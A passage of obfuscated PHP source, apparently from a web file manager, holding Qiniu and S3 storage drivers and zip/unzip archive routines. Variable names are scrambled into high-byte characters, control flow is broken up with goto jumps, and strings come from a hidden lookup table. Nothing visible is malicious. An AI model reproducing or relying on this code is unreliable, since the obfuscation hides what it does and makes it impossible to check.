$fšÔÁò©è» - 1; $DÃÈä†±§Ï = array($EË³â¥Ô[1316] . $c°ƒÌË‘…× . $EË³â¥Ô[449] . $DñÂ«İá); } $F²ÉŠˆŠ¥ô = url_request($Cœ¯È…É, $EË³â¥Ô[228], !1, $DÃÈä†±§Ï); return $F²ÉŠˆŠ¥ô[$EË³â¥Ô[726]] ? $F²ÉŠˆŠ¥ô[$EË³â¥Ô[1096]] : !1; } public function upload($e›ï‡š¢¸Ÿ, $f¥—âá¤ËÒ, $dÙ…Ä”·ª¼ = false, $A‡ùâÜò = REPEAT_REPLACE) { $fÏÊ‘Ô„÷Á = new Qiniu\Storage\UploadManager(); $b‹»›Àô¾ = $this->auth->uploadToken($this->bucket, $e›ï‡š¢¸Ÿ); $E¤ÛíñÚë = get_file_mime(get_path_ext($f¥—âá¤ËÒ)); list($B¯§•’‹£, $dîêåÅ±) = $fÏÊ‘Ô„÷Á->putFile($b‹»›Àô¾, $e›ï‡š¢¸Ÿ, $f¥—âá¤ËÒ, null, $E¤ÛíñÚë); return $dîêåÅ± ? !1 : $this->getPathOuter($e›ï‡š¢¸Ÿ); } public function uploadFormData($DéÌŒÌ†ˆï, $a‘’å®ù”­ = 3600) { return $this->uploadToken($DéÌŒÌ†ˆï, $a‘’å®ù”­); } public function multiUploadFormData($b¾Â–‰î—, $D§ÙÈ‰°†º = 3600) { return $this->uploadToken($b¾Â–‰î—, $D§ÙÈ‰°†º); } private function uploadToken($B§öÖ–¿é, $EÔÕÁ„ÛÃ = 3600) { goto C¬È²öÍÁ„; C¬È²öÍÁ„: $fäîÒ É§ =& $_SERVER[úÉ·öƒÑì©]; $B‚…ÓæÀƒÜ = $EÔÕÁ„ÛÃ; $d‘µ…î‘’Š = array($fäîÒ É§[1317] => $fäîÒ É§[1318]); goto C‡éø±Ò; C‡éø±Ò: $b˜àÀ”´ãö = $B§öÖ–¿é; $EĞÂ¦Ä´†Ù = $this->auth->uploadToken($this->bucket, $b˜àÀ”´ãö, $B‚…ÓæÀƒÜ, $d‘µ…î‘’Š, !0); $aä“É¼„ = empty($this->region) || $this->region == $fäîÒ É§[1319] ? $fäîÒ É§[33] : $fäîÒ É§[449] . $this->region; goto D™Ë±‚Å; D™Ë±‚Å: $Dáâßê–‚µ = http_type() . "\x3a\57\x2f\x75\160\x6c\157\x61\x64{$aä“É¼„}\x2e\x71\151\156\x69\x75\x70\x2e\x63\x6f\155\57"; return array($fäîÒ É§[1320] => $EĞÂ¦Ä´†Ù, $fäîÒ É§[1321] => $Dáâßê–‚µ); goto eÎğŠ¢Ïß; eÎğŠ¢Ïß: } public function download($f“ƒî¸Ì , $e¤‰àÀÊ§¯) { goto BòÈÅ’…Äö; BòÈÅ’…Äö: $B²½Şµº = IO::getPathInner(IO::mkfile($e¤‰àÀÊ§¯)); if (!($EŸÖ¯Ï¹¯” = $this->link($f“ƒî¸Ì ))) { return !1; } $BÈØÅÔÜœñ = 0; goto däÌ¹Ù²¤ã; däÌ¹Ù²¤ã: $f•ÄÃôëğ = 1024 * 200; $cÔ„Ö®«Ä° = fopen($B²½Şµº, $_SERVER[úÉ·öƒÑì©][1322]); while (!0) { $aíÇ†“¡‹ã = $this->fileSubstr($f“ƒî¸Ì , $BÈØÅÔÜœñ, $f•ÄÃôëğ); if ($aíÇ†“¡‹ã === !1) { return !1; } fwrite($cÔ„Ö®«Ä°, $aíÇ†“¡‹ã); $BÈØÅÔÜœñ += $f•ÄÃôëğ; if (strlen($aíÇ†“¡‹ã) < $f•ÄÃôëğ) { break; } } goto c‹ŠŸ®Äã©; c‹ŠŸ®Äã©: fclose($cÔ„Ö®«Ä°); return $e¤‰àÀÊ§¯; goto E—Â‘î˜Ó; E—Â‘î˜Ó: } public function link($aÀ…ÂîÅ‚ß, $d¿†“‡±¦¼ = '') { if (!$this->isFile($aÀ…ÂîÅ‚ß)) { return !1; } $e¦¼™é”À = $this->getHost() . $_SERVER[úÉ·öƒÑì©][8] . $this->pathEncode($aÀ…ÂîÅ‚ß) . $d¿†“‡±¦¼; return $this->auth->privateDownloadUrl($e¦¼™é”À, 3600 * 12); } public function fileOut($B‘¯°˜à¦Ô, $bŸÊˆËË„İ = false, $B÷àÙÈ×³õ = false, $B«â”¼Ê¹³ = '') { $A¯¿ÚîÀã =& $_SERVER[úÉ·öƒÑì©]; if ($this->isFileOutServer()) { return $this->fileOutServer($B‘¯°˜à¦Ô, $bŸÊˆËË„İ, $B÷àÙÈ×³õ, $B«â”¼Ê¹³); } if (!$B÷àÙÈ×³õ) { $B÷àÙÈ×³õ = $this->pathThis($B‘¯°˜à¦Ô); } $e‘¡°Ü¦•Ã = $bŸÊˆËË„İ ? $A¯¿ÚîÀã[1323] . rawurlencode($B÷àÙÈ×³õ) : $A¯¿ÚîÀã[33]; $Dçµ×ã¦ = $this->link($B‘¯°˜à¦Ô, $e‘¡°Ü¦•Ã); $this->fileOutLink($Dçµ×ã¦); } public function fileOutServer($b¯«Ö¦ïëÎ, $cº·ÚËòä = false, $eğŠ«°ôæ = false, $cã÷®ØĞíŒ = '') { parent::fileOut($b¯«Ö¦ïëÎ, $cº·ÚËòä, $eğŠ«°ôæ, $cã÷®ØĞíŒ); } public function fileOutImage($E›ŞæÓ¶Ş, $BºÂ¼£§·Ç = 250) { $eĞ‚…“¿ç¼ = $this->link($E›ŞæÓ¶Ş, $_SERVER[úÉ·öƒÑì©][1324] . $BºÂ¼£§·Ç); $this->fileOutLink($eĞ‚…“¿ç¼); } public function fileOutImageServer($CÏöøÄƒ¨³, $c‘î°°İ¾ = 250) { parent::fileOutImage($CÏöøÄƒ¨³, $c‘î°°İ¾); } public function hashMd5($fÛ¡¦Æø‘„) { $e³´©‘‚ë  =& $_SERVER[úÉ·öƒÑì©]; $FºÕ ô®± = $this->objectMeta($fÛ¡¦Æø‘„); return isset($FºÕ ô®±[$e³´©‘‚ë [208]]) ? $FºÕ ô®±[$e³´©‘‚ë [208]] : !1; $cî±¬»“ö˜ = $this->link($fÛ¡¦Æø‘„, $e³´©‘‚ë [1325]); } public function size($d’¬äöŸ) { $b¨ŠâÉÈ« = $this->objectMeta($d’¬äöŸ); return $b¨ŠâÉÈ« ? $b¨ŠâÉÈ«[$_SERVER[úÉ·öƒÑì©][78]] : 0; } public function info($cÔô¦éËŸƒ) { if ($this->isFolder($cÔô¦éËŸƒ)) { return $this->folderInfo($cÔô¦éËŸƒ); } else { if ($this->isFile($cÔô¦éËŸƒ)) { return $this->fileInfo($cÔô¦éËŸƒ); } } return !1; } public function exist($Eò½¤ÃšÂ‹) { return $this->isFile($Eò½¤ÃšÂ‹) || $this->isFolder($Eò½¤ÃšÂ‹); } public function isFile($BØğ £¿®õ) { return !$this->isFolder($BØğ £¿®õ) && $this->objectMeta($BØğ £¿®õ); } public function isFolder($A áªë®›À) { return $this->cacheMethod($_SERVER[úÉ·öƒÑì©][199], $A áªë®›À); } protected function objectMeta($dÕó¬ëÒŞÑ) { return $this->cacheMethod($_SERVER[úÉ·öƒÑì©][200], $dÕó¬ëÒŞÑ); } protected function _objectMeta($a…’Î®¤“Ò) { $Béº—ƒÌ¿Â =& $_SERVER[úÉ·öƒÑì©]; list($dîÛêÆë£, $d£‰¾ÆøÎ·) = $this->bucketManager->stat($this->bucket, $a…’Î®¤“Ò); if ($dîÛêÆë£) { $dîÛêÆë£[$Béº—ƒÌ¿Â[78]] = intval($dîÛêÆë£[$Béº—ƒÌ¿Â[1311]]); } return $dîÛêÆë£; } protected function _isFolder($c¢’“ ëˆè) { $c™÷ˆ¨Õõ =& $_SERVER[úÉ·öƒÑì©]; if ($c¢’“ ëˆè == $c™÷ˆ¨Õõ[33] || $c¢’“ ëˆè == $c™÷ˆ¨Õõ[8]) { return !0; } list($BòöÖ÷‚í», $fÌÁ‡ˆÀ²) = $this->bucketManager->listFiles($this->bucket, trim($c¢’“ ëˆè, $c™÷ˆ¨Õõ[8]) . $c™÷ˆ¨Õõ[8], $c™÷ˆ¨Õõ[33], 1, $c™÷ˆ¨Õõ[8]); return !empty($BòöÖ÷‚í»[$c™÷ˆ¨Õõ[1314]]) || !empty($BòöÖ÷‚í»[$c™÷ˆ¨Õõ[1315]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($b¼¬Ù‚‘§ˆ) { parent::__construct($b¼¬Ù‚‘§ˆ); } public function uploadFormData($A‹•©÷öÈ, $BáŠÑÒ˜¾ = 3600) { goto C·îŞÖ·; C·îŞÖ·: $A»ÂŠÑ =& $_SERVER[úÉ·öƒÑì©]; $Dß½Üãõ¬ = $A»ÂŠÑ[192]; $CÊ“ï–¹Ğµ = $A»ÂŠÑ[1231]; goto B¨¨²ÉøÛ; d§ˆ±ëÔ°†: $E®äİ àƒ = base64_encode(json_encode($b¯ˆ‰´äİâ)); $cï§£Ÿ¥Íˆ = hash_hmac($A»ÂŠÑ[1241], $eô°©¹ŒÛÇ, $A»ÂŠÑ[1242] . $this->secret, !0); $fŠ°Û‹Ü²ğ = hash_hmac($A»ÂŠÑ[1241], $this->region, $cï§£Ÿ¥Íˆ, !0); goto aËÓ¦ãĞ÷; aËÓ¦ãĞ÷: $B££Šù©¡· = hash_hmac($A»ÂŠÑ[1241], $B„ö‰Ú‚¾·, $fŠ°Û‹Ü²ğ, !0); $FÇ–ù® ä = hash_hmac($A»ÂŠÑ[1241], $Bõ‚……–œó, $B££Šù©¡·, !0); $D¦”ÂŞÕ«Õ = hash_hmac($A»ÂŠÑ[1241], $E®äİ àƒ, $FÇ–ù® ä); goto F‰ÅâñĞ«ñ; B¨¨²ÉøÛ: $B„ö‰Ú‚¾· = $A»ÂŠÑ[59]; $Bêõ¡ÔÏ‚ = gmdate($A»ÂŠÑ[1232]); $eô°©¹ŒÛÇ = gmdate($A»ÂŠÑ[727]); goto DÚäÀˆ£; C‚Äšì‡••: $F Êˆ‡„ğ„ = array($this->accessKey, $eô°©¹ŒÛÇ, $this->region, $B„ö‰Ú‚¾·, $Bõ‚……–œó); $BŠÓ†×öÀ¼ = implode($A»ÂŠÑ[8], $F Êˆ‡„ğ„); $b¯ˆ‰´äİâ = array($A»ÂŠÑ[1198] => gmdate($A»ÂŠÑ[1197], strtotime($A»ÂŠÑ[1234])), $A»ÂŠÑ[1199] => array(array($A»ÂŠÑ[1201] => $this->bucket), array($A»ÂŠÑ[1200] => $Dß½Üãõ¬), array($A»ÂŠÑ[1202], $A»ÂŠÑ[1203], $A»ÂŠÑ[33]), array($A»ÂŠÑ[1202], $A»ÂŠÑ[1235], $A»ÂŠÑ[33]), array($A»ÂŠÑ[1202], $A»ÂŠÑ[1236], $A»ÂŠÑ[33]), array($A»ÂŠÑ[1204] => $e…’ó“—İ), array($A»ÂŠÑ[1237] => $BŠÓ†×öÀ¼), array($A»ÂŠÑ[1238] => $CÊ“ï–¹Ğµ), array($A»ÂŠÑ[1239] => $Bêõ¡ÔÏ‚), array($A»ÂŠÑ[1240] => $e­Ä­°Ù­Ê))); goto d§ˆ±ëÔ°†; F‰ÅâñĞ«ñ: $C‘¹—›è‘¾ = array($A»ÂŠÑ[211] => $A»ÂŠÑ[33], $A»ÂŠÑ[1243] => $A»ÂŠÑ[33], $A»ÂŠÑ[1200] => $Dß½Üãõ¬, $A»ÂŠÑ[1204] => $e…’ó“—İ, $A»ÂŠÑ[1208] => $E®äİ àƒ, $A»ÂŠÑ[1244] => $BŠÓ†×öÀ¼, $A»ÂŠÑ[1245] => $CÊ“ï–¹Ğµ, $A»ÂŠÑ[1246] => $Bêõ¡ÔÏ‚, $A»ÂŠÑ[1247] => $e­Ä­°Ù­Ê, $A»ÂŠÑ[1248] => $D¦”ÂŞÕ«Õ, $A»ÂŠÑ[175] => $this->getHost()); return $C‘¹—›è‘¾; goto f‘ŞÑÅ¥à; DÚäÀˆ£: $Bõ‚……–œó = $A»ÂŠÑ[1233]; $e­Ä­°Ù­Ê = $BáŠÑÒ˜¾ . $A»ÂŠÑ[33]; $e…’ó“—İ = $A»ÂŠÑ[1196]; goto C‚Äšì‡••; f‘ŞÑÅ¥à: } public function multiUploadFormData($cåîÑ¼ï½, $eÜß ²º† = 3600) { $Eö‚Š¶Ó³ =& $_SERVER[úÉ·öƒÑì©]; $däšÓ³°æç = gmdate($Eö‚Š¶Ó³[1326]); $C·‹°ä¶ = array(); $Eõì“öå = $this->client->getUploadId($this->bucket, $cåîÑ¼ï½, $C·‹°ä¶); if (!$Eõì“öå) { return !1; } return array($Eö‚Š¶Ó³[221] => $Eõì“öå, $Eö‚Š¶Ó³[175] => $this->getHost() . $Eö‚Š¶Ó³[8] . $this->pathEncode($cåîÑ¼ï½), $Eö‚Š¶Ó³[222] => $däšÓ³°æç, $Eö‚Š¶Ó³[93] => $cåîÑ¼ï½); } public function multiUploadAuthData($eÛÒ°©Öš„, $D†™´èèˆ‡ = array()) { goto E£Ôöƒ“¾Ã; f´è¥ë‚¡Œ: if (strpos($Dº˜œ‚½Ûø, $A‹ŸÀÍ¼[225]) === 0) { if (isset($bÁÌ¸†ÖŒÖ[$A‹ŸÀÍ¼[1328]])) { $DãèÒ•›¬ = $bÁÌ¸†ÖŒÖ[$A‹ŸÀÍ¼[1328]]; } else { if (isset($A¢Âµå½¥[$A‹ŸÀÍ¼[1328]])) { $DãèÒ•›¬ = $A¢Âµå½¥[$A‹ŸÀÍ¼[1328]]; } else { $DãèÒ•›¬ = hash($A‹ŸÀÍ¼[1241], $A‹ŸÀÍ¼[33]); } } return array($A‹ŸÀÍ¼[232] => $A¢Âµå½¥[$A‹ŸÀÍ¼[232]], $A‹ŸÀÍ¼[1328] => $DãèÒ•›¬, $A‹ŸÀÍ¼[222] => $A¢Âµå½¥[$A‹ŸÀÍ¼[1331]]); } return $A¢Âµå½¥[$A‹ŸÀÍ¼[232]]; goto e¨‰‹‰õÅÃ; E£Ôöƒ“¾Ã: $A‹ŸÀÍ¼ =& $_SERVER[úÉ·öƒÑì©]; $Dº˜œ‚½Ûø = isset($D†™´èèˆ‡[$A‹ŸÀÍ¼[168]]) ? $D†™´èèˆ‡[$A‹ŸÀÍ¼[168]] : $A‹ŸÀÍ¼[33]; $aã·¹é‡õ„ = $D†™´èèˆ‡[$A‹ŸÀÍ¼[93]]; goto eà‡ë²¹Á; FÛöà‰”: if (isset($D†™´èèˆ‡[$A‹ŸÀÍ¼[1327]])) { $bÁÌ¸†ÖŒÖ[$A‹ŸÀÍ¼[1328]] = $D†™´èèˆ‡[$A‹ŸÀÍ¼[1327]]; } $C¨ö©æÔÔ‚ = explode($A‹ŸÀÍ¼[177], $this->getHost()); $e­¬ÓÕ»ÙÆ = array($A‹ŸÀÍ¼[1329] => $C¨ö©æÔÔ‚[1], $A‹ŸÀÍ¼[1330] => $A‹ŸÀÍ¼[33], $A‹ŸÀÍ¼[211] => $A‹ŸÀÍ¼[119], $A‹ŸÀÍ¼[1243] => $D†™´èèˆ‡[$A‹ŸÀÍ¼[78]]); goto e†Ã¼ˆ½ªõ; eà‡ë²¹Á: unset($D†™´èèˆ‡[$A‹ŸÀÍ¼[93]]); if (isset($D†™´èèˆ‡[$A‹ŸÀÍ¼[223]])) { return $this->listUploadParts($aã·¹é‡õ„, $D†™´èèˆ‡); } $bÁÌ¸†ÖŒÖ = array(); goto FÛöà‰”; e†Ã¼ˆ½ªõ: $BÕ«ŒÇšâ = $A‹ŸÀÍ¼[226]; $BµÌ†òëé† = $A‹ŸÀÍ¼[8] . $this->pathEncode($aã·¹é‡õ„) . $Dº˜œ‚½Ûø; $A¢Âµå½¥ = $this->client->__getSignatureV4($bÁÌ¸†ÖŒÖ, $e­¬ÓÕ»ÙÆ, $BÕ«ŒÇšâ, $BµÌ†òëé†); goto f´è¥ë‚¡Œ; e¨‰‹‰õÅÃ: } public function listUploadParts($B–­²¸ÛĞï, $f…Ä—¶‰ß« = array()) { goto EèÖæñ•«¥; EèÖæñ•«¥: $BÑÓ¡Ç§„ =& $_SERVER[úÉ·öƒÑì©]; $dÓÕƒÆ¢ß = str_replace($BÑÓ¡Ç§„[233], $BÑÓ¡Ç§„[33], $f…Ä—¶‰ß«[$BÑÓ¡Ç§„[168]]); $DË¤‡Àà = $this->client->listParts($this->bucket, $B–­²¸ÛĞï, $dÓÕƒÆ¢ß); goto A‹ïƒÓô¾‚; a¿¶Â¤ª‘: $ağªİ†œòÇ = array($BÑÓ¡Ç§„[1329] => $eÖ©ôÓÔµ[1], $BÑÓ¡Ç§„[211] => $BÑÓ¡Ç§„[119], $BÑÓ¡Ç§„[1243] => strlen($CÒƒÚé—×¿)); $FÓİ·Åº–’ = $BÑÓ¡Ç§„[224]; $d¥Ì †åë = $BÑÓ¡Ç§„[8] . $this->pathEncode($B–­²¸ÛĞï) . $f…Ä—¶‰ß«[$BÑÓ¡Ç§„[168]]; goto Eä¡ƒÜÍÍ; f¥¿ˆ§×¥: $CÒƒÚé—×¿ .= $BÑÓ¡Ç§„[1335]; $D¿¡´‚ì³» = array(); $eÖ©ôÓÔµ = explode($BÑÓ¡Ç§„[177], $this->getHost()); goto a¿¶Â¤ª‘; Eä¡ƒÜÍÍ: $fœèŠ‘˜£Û = $this->client->__getSignatureV4($D¿¡´‚ì³», $ağªİ†œòÇ, $FÓİ·Åº–’, $d¥Ì †åë, $CÒƒÚé—×¿); return array($BÑÓ¡Ç§„[232] => $fœèŠ‘˜£Û[$BÑÓ¡Ç§„[232]], $BÑÓ¡Ç§„[222] => $fœèŠ‘˜£Û[$BÑÓ¡Ç§„[1331]], $BÑÓ¡Ç§„[234] => $DË¤‡Àà, $BÑÓ¡Ç§„[1328] => $fœèŠ‘˜£Û[$BÑÓ¡Ç§„[1328]]); goto FÛÑ—ÅìŒ; A‹ïƒÓô¾‚: if (!$DË¤‡Àà) { return !1; } $CÒƒÚé—×¿ = $BÑÓ¡Ç§„[1332]; foreach ($DË¤‡Àà as $B™‹Ğ¸§å‡) { $CÒƒÚé—×¿ .= $BÑÓ¡Ç§„[1333] . "\x3c\x50\x61\x72\164\116\x75\x6d\142\x65\x72\76{$B™‹Ğ¸§å‡[$BÑÓ¡Ç§„[1288]]}\x3c\x2f\120\141\162\164\x4e\165\x6d\x62\145\x72\x3e\xa" . "\74\x45\124\141\147\76{$B™‹Ğ¸§å‡[$BÑÓ¡Ç§„[1289]]}\x3c\57\105\124\x61\147\76\12" . $BÑÓ¡Ç§„[1334]; } goto f¥¿ˆ§×¥; FÛÑ—ÅìŒ: } public function link($a™õ¦„“ŸÆ, $EºÓ¤×æ‘Ñ = array()) { return parent::link($a™õ¦„“ŸÆ, $EºÓ¤×æ‘Ñ); } public function fileOut($bÏÀÃÓ³»×, $EİäŒÕæ§ = false, $C¿Õ©Œ± = false, $D Ş¤ËÑ‰ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[úÉ·öƒÑì©][1336])) { return parent::fileOutServer($bÏÀÃÓ³»×, $EİäŒÕæ§, $C¿Õ©Œ±, $D Ş¤ËÑ‰); } parent::fileOut($bÏÀÃÓ³»×, $EİäŒÕæ§, $C¿Õ©Œ±, $D Ş¤ËÑ‰); } public function fileOutImage($F£ñ“èì‡£, $b‡«åçâª£ = 250) { if (strstr($this->endpoint, $_SERVER[úÉ·öƒÑì©][1336])) { return parent::fileOutImageServer($F£ñ“èì‡£, $b‡«åçâª£); } parent::fileOutImage($F£ñ“èì‡£, $b‡«åçâª£); } public function fileOutLink($Cß‚ïÈ„¹Ò) { $dùÙ¾°Ú‘’ =& $_SERVER[úÉ·öƒÑì©]; if (substr($Cß‚ïÈ„¹Ò, 0, 7) == $dùÙ¾°Ú‘’[1211]) { $Cß‚ïÈ„¹Ò = $dùÙ¾°Ú‘’[1212] . substr($Cß‚ïÈ„¹Ò, 7); } header($dùÙ¾°Ú‘’[159] . $Cß‚ïÈ„¹Ò); die; } public function getHost() { $f»éÕáŒ =& $_SERVER[úÉ·öƒÑì©]; $f–ñ©ˆœÒ¿ = str_rtrim(parent::getHost(), $f»éÕáŒ[8] . $this->bucket); $f–ñ©ˆœÒ¿ = explode($f»éÕáŒ[177], $f–ñ©ˆœÒ¿); return $f–ñ©ˆœÒ¿[0] . $f»éÕáŒ[177] . $this->bucket . $f»éÕáŒ[95] . $f–ñ©ˆœÒ¿[1]; } } goto C°²à«õ½Ü; fà¹éÁÁŸ: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $B¯‚Á´ÈŒˆ; if (!$B¯‚Á´ÈŒˆ) { $B¯ÁÂÙáŞ½ = IO::init($_SERVER[úÉ·öƒÑì©][8]); } return $B¯ÁÂÙáŞ½; } private static function iconvSystem($eÜÎˆ–ŠØ) { return self::local()->iconvSystem($eÜÎˆ–ŠØ); } private static function iconvApp($DÊÎÏ¡¨äÀ) { return self::local()->iconvApp($DÊÎÏ¡¨äÀ); } public static function zip($c­™¢‹¡ãø, $cÖ Ïê†öÈ = "\x7a\x69\x70", $Bè÷äÑÉÌÕ = '', $B³á‡÷ß‡ª = REPEAT_RENAME) { goto eá…´¿õøä; eá…´¿õøä: $cß™Ü›•¹ =& $_SERVER[úÉ·öƒÑì©]; $C‰‹¹õ´ÙÄ = self::init($c­™¢‹¡ãø[0][$cß™Ü›•¹[76]]); $AùœíÊ = self::info($c­™¢‹¡ãø[0][$cß™Ü›•¹[76]]); goto dËÓâ°ƒ°Û; a†ĞÜÑº½À: if (!$f…‘‹ñ®“) { del_dir($Dƒµ¥á¯òÇ); show_json(LNG($cß™Ü›•¹[1089]), !1); } del_dir($Dƒµ¥á¯òÇ); return $f…‘‹ñ®“; goto FóèŞ‘…º½; F£ÜÏ†ÚË: foreach ($d¨ª™µÅ¬Æ as $EÀ›«øéÊÀ => $F†ëµ–¯¥¶) { $d¨ª™µÅ¬Æ[$EÀ›«øéÊÀ] = self::iconvSystem($F†ëµ–¯¥¶); } KodArchive::create($Dæš‰ğÒÉ“, $d¨ª™µÅ¬Æ); if (!IO::exist($fÚ‘’‚ØÖ…)) { if ($Dƒµ¥á¯òÇ) { del_dir($Dƒµ¥á¯òÇ); } show_json(LNG($cß™Ü›•¹[1089]), !1); } goto b¬—ìˆ½¹œ; dËÓâ°ƒ°Û: $Dƒµ¥á¯òÇ = !1; if (!$Bè÷äÑÉÌÕ && $C‰‹¹õ´ÙÄ->getType() == $cß™Ü›•¹[106]) { $d¨ª™µÅ¬Æ = self::zipFileList($c­™¢‹¡ãø); } else { $Dƒµ¥á¯òÇ = $Bè÷äÑÉÌÕ ? $Bè÷äÑÉÌÕ : TEMP_FILES . $cß™Ü›•¹[1087] . time() . rand_string(8) . $cß™Ü›•¹[8]; mk_dir($Dƒµ¥á¯òÇ); $d¨ª™µÅ¬Æ = self::zipFileList($c­™¢‹¡ãø, $Dƒµ¥á¯òÇ); } $e­ÊÓä‹ˆ» = $AùœíÊ[$cß™Ü›•¹[28]]; goto EŞÜŒ¿òœ¼; a§øìø‰Ç™: $fÚ‘’‚ØÖ… = $BÖ°ôÄ×«… . $e­ÊÓä‹ˆ» . $cß™Ü›•¹[95] . $cÖ Ïê†öÈ; $fÚ‘’‚ØÖ… = get_filename_auto($fÚ‘’‚ØÖ…, $cß™Ü›•¹[33], $B³á‡÷ß‡ª); $Dæš‰ğÒÉ“ = self::iconvSystem($fÚ‘’‚ØÖ…); goto F£ÜÏ†ÚË; b¬—ìˆ½¹œ: if ($Bè÷äÑÉÌÕ || !$Dƒµ¥á¯òÇ) { if ($Dƒµ¥á¯òÇ && strstr($Dƒµ¥á¯òÇ, TEMP_FILES)) { $d† ë×†Š = $d¨ª™µÅ¬Æ = array(); recursion_dir($BÖ°ôÄ×«…, $d† ë×†Š, $d¨ª™µÅ¬Æ, 0); foreach ($d† ë×†Š as $D¹÷ŒŒ‘ÔŒ) { del_dir($D¹÷ŒŒ‘ÔŒ); } foreach ($d¨ª™µÅ¬Æ as $E”ƒÌ¤) { if ($E”ƒÌ¤ == $Dæš‰ğÒÉ“) { continue; } del_file($E”ƒÌ¤); } } return $fÚ‘’‚ØÖ…; } $dåé’ğéÏ = self::pathFather($AùœíÊ[$cß™Ü›•¹[76]]); $f…‘‹ñ®“ = self::move($fÚ‘’‚ØÖ…, $dåé’ğéÏ, $B³á‡÷ß‡ª); goto a†ĞÜÑº½À; EŞÜŒ¿òœ¼: if (count($d¨ª™µÅ¬Æ) > 1) { $AæÖ¯õŠŞß = IO::info(IO::pathFather($AùœíÊ[$cß™Ü›•¹[76]])); $e­ÊÓä‹ˆ» = $AæÖ¯õŠŞß[$cß™Ü›•¹[28]]; } $BÖ°ôÄ×«… = $Dƒµ¥á¯òÇ; if (!$BÖ°ôÄ×«…) { $BÖ°ôÄ×«… = get_path_father($AùœíÊ[$cß™Ü›•¹[76]]); if (!$Bè÷äÑÉÌÕ && $C‰‹¹õ´ÙÄ->getType() == $cß™Ü›•¹[106]) { $BÖ°ôÄ×«… = get_path_father($C‰‹¹õ´ÙÄ->path); } $c³ÅÚ˜ğİæ = IO::info($BÖ°ôÄ×«…); if (!$c³ÅÚ˜ğİæ[$cß™Ü›•¹[196]]) { show_json(LNG($cß™Ü›•¹[1088]), !1); } } goto a§øìø‰Ç™; FóèŞ‘…º½: } public static function unzip($Eéäèïáî, $eÌ™Ğ””µ³ = "\x72\145\160\x6c\x61\x63\145") { goto f‡¬‹â÷¨Ÿ; DßÒÈÍ’¼: $BÛË¥”–¿£ = self::tmpFileName($bµÛèç»‡); $EÍ†”õì Î = TEMP_FILES . $BÛË¥”–¿£; del_dir($EÍ†”õì Î); goto DÒŒå£À“; DÒŒå£À“: mk_dir($EÍ†”õì Î); $f´ƒ¾Ö£ = self::fileExt($bµÛèç»‡); $a©Øµë›’¹ = $EÍ†”õì Î . $Bíåø‰ÁÛ¾[95] . $f´ƒ¾Ö£; goto F ©³ğù×“; DŠì†ÁÏ˜Ã: $fæØÓÔñ¢ = KodArchive::extract($a©Øµë›’¹, $EÍ†”õì Î . $Bíåø‰ÁÛ¾[8], $f¨š¡â–); self::archiveExt(); if (!$fæØÓÔñ¢[$Bíåø‰ÁÛ¾[1094]]) { show_json($Bíåø‰ÁÛ¾[1095] . $fæØÓÔñ¢[$Bíåø‰ÁÛ¾[1096]], !1); } goto f½è½õ³Øù; d‰¸§×ƒñ¶: foreach ($CºÀÑÊÅÇ¾ as $D–«¤ŒÆÂ¸) { $D–«¤ŒÆÂ¸ = self::iconvApp($D–«¤ŒÆÂ¸); self::move($D–«¤ŒÆÂ¸, $d»Š·ÜšÂä, $eÌ™Ğ””µ³); } del_dir($EÍ†”õì Î); if (!$b§‡‡ŸÚä) { del_file($a©Øµë›’¹); } goto FÌßÇÅÄ; F ©³ğù×“: if (!@file_exists(self::iconvSystem($a©Øµë›’¹))) { $b§‡‡ŸÚä = self::localFilePath($eÙè£À„‡Œ, $f´ƒ¾Ö£); $a©Øµë›’¹ = $b§‡‡ŸÚä ? $b§‡‡ŸÚä : parent::download($eÙè£À„‡Œ, $a©Øµë›’¹); } $a©Øµë›’¹ = self::iconvSystem($a©Øµë›’¹); $f¨š¡â– = isset($Eéäèïáî[$Bíåø‰ÁÛ¾[1092]]) ? $Eéäèïáî[$Bíåø‰ÁÛ¾[1092]] : $Bíåø‰ÁÛ¾[1093]; goto DŠì†ÁÏ˜Ã; f½è½õ³Øù: Hook::trigger($Bíåø‰ÁÛ¾[1097], $EÍ†”õì Î); recursion_dir($EÍ†”õì Î, $c¡Š åË×í, $Aô‹¶÷ÓÄŞ, 0); $CºÀÑÊÅÇ¾ = array_merge($c¡Š åË×í, $Aô‹¶÷ÓÄŞ); goto d‰¸§×ƒñ¶; f‡¬‹â÷¨Ÿ: $Bíåø‰ÁÛ¾ =& $_SERVER[úÉ·öƒÑì©]; $eÙè£À„‡Œ = $Eéäèïáî[$Bíåø‰ÁÛ¾[76]]; $d»Š·ÜšÂä = $Eéäèïáî[$Bíåø‰ÁÛ¾[1090]]; goto f‰Ê áº„¹; FÌßÇÅÄ: return !0; goto FÛ‚öäêåä; f‰Ê áº„¹: if (!($bµÛèç»‡ = parent::info($eÙè£À„‡Œ))) { show_json(LNG($Bíåø‰ÁÛ¾[1091]), !1); } if (!($C¤šõÀïº… = parent::infoFull($d»Š·ÜšÂä))) { $d»Š·ÜšÂä = parent::mkdir($d»Š·ÜšÂä); $C¤šõÀïº… = array($Bíåø‰ÁÛ¾[76] => $d»Š·ÜšÂä); } else { if (isset($C¤šõÀïº…[$Bíåø‰ÁÛ¾[404]]) && trim($C¤šõÀïº…[$Bíåø‰ÁÛ¾[76]], $Bíåø‰ÁÛ¾[8]) != trim($d»Š·ÜšÂä, $Bíåø‰ÁÛ¾[8])) { $DšŠĞƒœˆõ = KodIO::make($C¤šõÀïº…[$Bíåø‰ÁÛ¾[487]]); $dëƒ¼Ãßò = parent::fileNameAuto($DšŠĞƒœˆõ, $C¤šõÀïº…[$Bíåø‰ÁÛ¾[28]], REPEAT_RENAME_FOLDER, !0); $d»Š·ÜšÂä = parent::mkdir($DšŠĞƒœˆõ . $dëƒ¼Ãßò); $C¤šõÀïº… = array($Bíåø‰ÁÛ¾[76] => $d»Š·ÜšÂä); } } $d»Š·ÜšÂä = $C¤šõÀïº…[$Bíåø‰ÁÛ¾[76]]; goto DßÒÈÍ’¼; FÛ‚öäêåä: } public static function unzipList($dƒøáæ‹„») { goto BİÉ¥ÑÔƒ; BØ¢£Ì  : $eÏğ‹“¹Š³ = self::info($E³×Ò´ì„Ô); $e×¿Ì«Ô = self::fileExt($eÏğ‹“¹Š³); $dô¢¿ñÆÈ” = self::tmpFileName($eÏğ‹“¹Š³); goto A‚Çšˆˆ; BİÉ¥ÑÔƒ: $AÖÏÉÈ†Ç =& $_SERVER[úÉ·öƒÑì©]; 